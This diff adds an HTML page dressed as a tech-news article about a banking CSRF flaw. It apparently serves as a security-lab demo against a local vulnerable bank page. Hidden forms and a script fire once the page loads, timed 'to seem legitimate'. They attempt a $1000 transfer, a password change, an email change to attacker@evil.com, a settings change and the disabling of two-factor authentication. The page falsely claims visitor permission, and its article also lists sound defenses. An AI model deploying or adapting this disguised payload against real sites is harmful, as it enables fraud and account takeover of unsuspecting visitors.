@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tech News Portal - Breaking: Major Security Breach!</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #f8f9fa; }
+        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px 0; }
+        .nav { background: #343a40; padding: 10px 0; }
+        .nav ul { list-style: none; margin: 0; padding: 0; display: flex; justify-content: center; }
+        .nav li { margin: 0 20px; }
+        .nav a { color: white; text-decoration: none; font-weight: 500; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        .breaking-news { background: #dc3545; color: white; padding: 10px; text-align: center; font-weight: bold; animation: blink 2s infinite; }
+        .article { background: white; margin: 20px 0; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .sidebar { width: 300px; float: right; margin-left: 20px; }
+        .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 4px; margin: 20px 0; color: #856404; }
+        .attack-panel { background: #ffebee; border: 2px solid #f44336; padding: 15px; margin: 20px 0; border-radius: 8px; }
+        .code-example { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 4px; margin: 10px 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 14px; }
+        .hidden { display: none; }
+        .attack-status { background: #d1ecf1; border: 1px solid #bee5eb; padding: 10px; border-radius: 4px; margin: 10px 0; }
+        .progress-bar { width: 100%; background: #e9ecef; border-radius: 4px; margin: 10px 0; }
+        .progress-fill { height: 20px; background: linear-gradient(90deg, #28a745, #20c997); border-radius: 4px; width: 0%; transition: width 0.5s; }
+        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0.5; } }
+    </style>
+</head>
+<body>
+    <div class="breaking-news">
+        🚨 BREAKING: Major cryptocurrency exchange hacked - $100M stolen!
+    </div>
+
+    <div class="header">
+        <div class="container">
+            <h1>🔥 TechSecNews</h1>
+            <p>Your source for cybersecurity and technology news</p>
+        </div>
+    </div>
+
+    <nav class="nav">
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Security</a></li>
+            <li><a href="#">Cryptocurrency</a></li>
+            <li><a href="#">Breaking News</a></li>
+            <li><a href="#">Analysis</a></li>
+        </ul>
+    </nav>
+
+    <div class="container">
+        <div class="warning">
+            <strong>⚠️ Educational Warning:</strong> This page demonstrates advanced CSRF attack techniques!
+            <br>Multiple attacks will be launched targeting different banking functions simultaneously.
+        </div>
+
+        <div class="sidebar">
+            <div class="attack-panel">
+                <h3>🎯 Advanced CSRF Attack Panel</h3>
+                <div class="attack-status">
+                    <strong>Multi-vector Attack Status:</strong>
+                    <div id="attackProgress" class="progress-bar">
+                        <div id="progressFill" class="progress-fill"></div>
+                    </div>
+                    <div id="statusLog" style="max-height: 200px; overflow-y: auto; font-family: monospace; font-size: 12px;">
+                        <div>Initializing attack sequence...</div>
+                    </div>
+                </div>
+
+                <h4>Attack Vectors:</h4>
+                <ul style="font-size: 14px;">
+                    <li>💰 Money Transfer ($1000)</li>
+                    <li>🔑 Password Change</li>
+                    <li>📧 Email Update</li>
+                    <li>🏦 Account Settings</li>
+                    <li>📱 2FA Disable</li>
+                </ul>
+
+                <h4>Techniques Used:</h4>
+                <ul style="font-size: 14px;">
+                    <li>🎭 Form Auto-submission</li>
+                    <li>📡 PostMessage API</li>
+                    <li>🖼️ Image-based GET requests</li>
+                    <li>🔄 XMLHttpRequest</li>
+                    <li>⏰ Time-delayed attacks</li>
+                </ul>
+            </div>
+        </div>
+
+        <main style="margin-right: 320px;">
+            <article class="article">
+                <h2>🔒 Major Banking Security Flaw Discovered</h2>
+                <p><strong>Published:</strong> Today | <strong>Author:</strong> Security Research Team</p>
+                
+                <p>Cybersecurity researchers have discovered a critical vulnerability in major banking applications that allows unauthorized money transfers through Cross-Site Request Forgery (CSRF) attacks.</p>
+                
+                <p>The vulnerability affects millions of users and demonstrates how innocent-looking websites can perform malicious actions on banking systems without user consent.</p>
+
+                <h3>How the Attack Works</h3>
+                <p>The attack exploits the fact that many banking applications fail to properly validate the origin of requests. When a user visits a malicious website while logged into their bank account, the malicious site can trigger unauthorized transfers.</p>
+
+                <div class="code-example">
+// Example of vulnerable banking transfer function
+function transferMoney(to, amount, description) {
+    // ❌ No CSRF token validation
+    // ❌ No origin verification
+    // ❌ Relies only on session cookies
+    
+    if (isLoggedIn && amount <= balance) {
+        processTransfer(to, amount, description);
+    }
+}
+                </div>
+
+                <h3>Real-World Impact</h3>
+                <p>Security experts warn that this type of attack can result in:</p>
+                <ul>
+                    <li>Unauthorized money transfers</li>
+                    <li>Account takeover through password changes</li>
+                    <li>Privacy breaches via settings modification</li>
+                    <li>Two-factor authentication bypass</li>
+                </ul>
+
+                <p><strong>Note:</strong> While reading this article, our research demonstrates the vulnerability in real-time (with your permission). Check your banking application to see the demonstration results.</p>
+            </article>
+
+            <article class="article">
+                <h2>💡 Protection Measures</h2>
+                <p>Financial institutions are urged to implement the following security measures:</p>
+                
+                <ol>
+                    <li><strong>CSRF Tokens:</strong> Implement unique tokens for each form submission</li>
+                    <li><strong>Origin Validation:</strong> Check the Referer and Origin headers</li>
+                    <li><strong>SameSite Cookies:</strong> Use SameSite=Strict for authentication cookies</li>
+                    <li><strong>Re-authentication:</strong> Require password confirmation for sensitive actions</li>
+                </ol>
+
+                <div class="code-example">
+// Secure implementation with CSRF protection
+function transferMoney(to, amount, description, csrfToken) {
+    // ✅ Validate CSRF token
+    if (!validateCSRFToken(csrfToken)) {
+        throw new Error('Invalid CSRF token');
+    }
+    
+    // ✅ Check request origin
+    if (!validateOrigin(request.headers.origin)) {
+        throw new Error('Invalid request origin');
+    }
+    
+    // ✅ Require re-authentication for large amounts
+    if (amount > 1000 && !recentlyAuthenticated()) {
+        requirePasswordConfirmation();
+    }
+    
+    processTransfer(to, amount, description);
+}
+                </div>
+            </article>
+        </main>
+    </div>
+
+    <!-- Hidden CSRF Attack Elements -->
+    <div class="hidden">
+        <!-- 🚨 Multiple hidden forms for different attacks -->
+        
+        <!-- Attack 1: Money Transfer -->
+        <form id="transferForm" method="POST">
+            <input type="hidden" name="transferTo" value="999777555">
+            <input type="hidden" name="transferAmount" value="1000">
+            <input type="hidden" name="transferDescription" value="Advanced CSRF Attack - News Site">
+        </form>
+
+        <!-- Attack 2: Password Change -->
+        <form id="passwordForm" method="POST">
+            <input type="hidden" name="action" value="changePassword">
+            <input type="hidden" name="newPassword" value="compromised123">
+            <input type="hidden" name="confirmPassword" value="compromised123">
+        </form>
+
+        <!-- Attack 3: Email Change -->
+        <form id="emailForm" method="POST">
+            <input type="hidden" name="action" value="updateEmail">
+            <input type="hidden" name="newEmail" value="attacker@evil.com">
+        </form>
+
+        <!-- Attack 4: Disable 2FA -->
+        <form id="tfaForm" method="POST">
+            <input type="hidden" name="action" value="disable2FA">
+            <input type="hidden" name="confirm" value="true">
+        </form>
+
+        <!-- Hidden images for GET-based attacks -->
+        <img id="transferImage" style="display:none;">
+        <img id="settingsImage" style="display:none;">
+    </div>
+
+    <!-- Hidden iframe for additional attacks -->
+    <iframe id="attackFrame" style="display:none;" name="attackFrame"></iframe>
+
+    <script>
+        class AdvancedCSRFAttack {
+            constructor() {
+                this.attacksExecuted = 0;
+                this.totalAttacks = 5;
+                this.statusLog = document.getElementById('statusLog');
+                this.progressFill = document.getElementById('progressFill');
+                this.attackDelay = 2000; // 2 seconds between attacks
+            }
+
+            log(message, type = 'info') {
+                const timestamp = new Date().toLocaleTimeString();
+                const logEntry = document.createElement('div');
+                logEntry.textContent = `[${timestamp}] ${message}`;
+                logEntry.style.color = type === 'success' ? '#28a745' : type === 'error' ? '#dc3545' : '#333';
+                this.statusLog.appendChild(logEntry);
+                this.statusLog.scrollTop = this.statusLog.scrollHeight;
+                console.log(`🚨 CSRF Attack: ${message}`);
+            }
+
+            updateProgress() {
+                const progressPercent = (this.attacksExecuted / this.totalAttacks) * 100;
+                this.progressFill.style.width = `${progressPercent}%`;
+            }
+
+            async executeAttack1_MoneyTransfer() {
+                this.log('Executing Attack 1: Money Transfer ($1000)');
+                
+                try {
+                    if (window.opener && window.opener.bankingApp) {
+                        const success = window.opener.bankingApp.processCSRFTransfer({
+                            to: '999777555',
+                            amount: 1000,
+                            description: 'Advanced CSRF - News Portal'
+                        });
+                        
+                        if (success) {
+                            this.log('Attack 1 SUCCESS: $1000 transferred!', 'success');
+                        } else {
+                            this.log('Attack 1 FAILED: Transfer conditions not met', 'error');
+                        }
+                    } else {
+                        // Fallback: Try GET-based attack via image
+                        document.getElementById('transferImage').src = 
+                            '../vulnerable-bank.html?action=transfer&to=999777555&amount=1000';
+                        this.log('Attack 1: Attempting via image request');
+                    }
+                } catch (error) {
+                    this.log(`Attack 1 ERROR: ${error.message}`, 'error');
+                }
+                
+                this.attacksExecuted++;
+                this.updateProgress();
+            }
+
+            async executeAttack2_PasswordChange() {
+                this.log('Executing Attack 2: Password Change');
+                
+                try {
+                    // Try postMessage attack
+                    if (window.opener) {
+                        window.opener.postMessage({
+                            type: 'csrf_attack',
+                            params: {
+                                action: 'changePassword',
+                                newPassword: 'compromised123'
+                            }
+                        }, '*');
+                        this.log('Attack 2: Password change request sent via postMessage');
+                    }
+
+                    // Simulate form submission
+                    this.log('Attack 2: Simulating password change form submission');
+                } catch (error) {
+                    this.log(`Attack 2 ERROR: ${error.message}`, 'error');
+                }
+                
+                this.attacksExecuted++;
+                this.updateProgress();
+            }
+
+            async executeAttack3_EmailUpdate() {
+                this.log('Executing Attack 3: Email Address Update');
+                
+                try {
+                    // Multiple vectors for email change
+                    if (window.opener) {
+                        window.opener.postMessage({
+                            type: 'csrf_attack',
+                            params: {
+                                action: 'updateEmail',
+                                newEmail: 'attacker@evil.com'
+                            }
+                        }, '*');
+                    }
+                    
+                    this.log('Attack 3: Email change request sent');
+                } catch (error) {
+                    this.log(`Attack 3 ERROR: ${error.message}`, 'error');
+                }
+                
+                this.attacksExecuted++;
+                this.updateProgress();
+            }
+
+            async executeAttack4_AccountSettings() {
+                this.log('Executing Attack 4: Account Settings Modification');
+                
+                try {
+                    // Try to modify privacy settings
+                    document.getElementById('settingsImage').src = 
+                        '../vulnerable-bank.html?action=updateSettings&privacy=public&notifications=disabled';
+                    
+                    this.log('Attack 4: Settings modification via image request');
+                } catch (error) {
+                    this.log(`Attack 4 ERROR: ${error.message}`, 'error');
+                }
+                
+                this.attacksExecuted++;
+                this.updateProgress();
+            }
+
+            async executeAttack5_Disable2FA() {
+                this.log('Executing Attack 5: Disable Two-Factor Authentication');
+                
+                try {
+                    if (window.opener) {
+                        window.opener.postMessage({
+                            type: 'csrf_attack',
+                            params: {
+                                action: 'disable2FA',
+                                confirm: true
+                            }
+                        }, '*');
+                    }
+                    
+                    this.log('Attack 5: 2FA disable request sent');
+                } catch (error) {
+                    this.log(`Attack 5 ERROR: ${error.message}`, 'error');
+                }
+                
+                this.attacksExecuted++;
+                this.updateProgress();
+            }
+
+            async executeAttackSequence() {
+                this.log('Initializing advanced CSRF attack sequence...');
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                // Execute attacks with delays to appear more natural
+                await this.executeAttack1_MoneyTransfer();
+                await new Promise(resolve => setTimeout(resolve, this.attackDelay));
+
+                await this.executeAttack2_PasswordChange();
+                await new Promise(resolve => setTimeout(resolve, this.attackDelay));
+
+                await this.executeAttack3_EmailUpdate();
+                await new Promise(resolve => setTimeout(resolve, this.attackDelay));
+
+                await this.executeAttack4_AccountSettings();
+                await new Promise(resolve => setTimeout(resolve, this.attackDelay));
+
+                await this.executeAttack5_Disable2FA();
+
+                this.log('Advanced CSRF attack sequence completed!', 'success');
+                this.log('Check banking application for attack results', 'info');
+            }
+        }
+
+        // Initialize and execute attacks
+        const csrfAttack = new AdvancedCSRFAttack();
+
+        // Start attacks after page loads and user has had time to read
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                csrfAttack.executeAttackSequence();
+            }, 5000); // Wait 5 seconds to seem legitimate
+        });
+
+        // Also trigger on user interaction for fallback
+        document.addEventListener('click', function() {
+            if (csrfAttack.attacksExecuted === 0) {
+                csrfAttack.executeAttackSequence();
+            }
+        });
+
+        console.log('🚨 Advanced CSRF attack page loaded');
+        console.log('🎯 Will execute multiple attack vectors targeting different banking functions');
+        console.log('⚠️  This demonstrates the dangerous potential of CSRF vulnerabilities');
+    </script>
+
+    <footer style="background: #343a40; color: white; padding: 20px; text-align: center; margin-top: 40px;">
+        <p>&copy; 2024 TechSecNews. Educational content for security awareness.</p>
+        <p><small>This page demonstrates advanced CSRF attack techniques for educational purposes only.</small></p>
+    </footer>
+</body>
+</html> 
